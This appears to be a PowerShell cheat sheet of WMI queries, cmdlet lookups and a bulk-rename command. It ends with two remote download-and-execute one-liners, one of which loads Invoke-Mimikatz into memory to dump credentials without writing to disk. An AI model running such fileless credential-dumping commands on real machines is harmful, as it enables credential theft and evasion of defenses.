#powershell

# get all available resource we can interact with
PS > get-wmiobject -list

# query running processes
PS > Get-WmiObject -Query "select * from Win32_Process" | format-table

# query using filters and/or boolean expressions
PS > Get-WmiObject -Query "select * from Win32_Process where name like 'chrome%' " | format-table

# query to find commandlets that have "write" in their name
PS > Get-Command | Where {$_.Name -like "*write*"}

# rename all files BASE and keep EXTENSION (-WhatIf == see what would happen; remove to actually perform)
PS > Get-ChildItem -Path .\ | Rename-Item -NewName {$_.Basename.Replace("old_name","new_name") + $_.extension} -WhatIf -Verbose

# download and execute JCERT.PS1
PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://github.com/b1nary0mega/incident-response/raw/master/JCERT.ps1')); JCERT.ps1}

# ***CAUTION*** load mimikatz into memory; completely bypassing binary on disk
PS > Invoke-Command MACHINE_NAME {iex((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds}
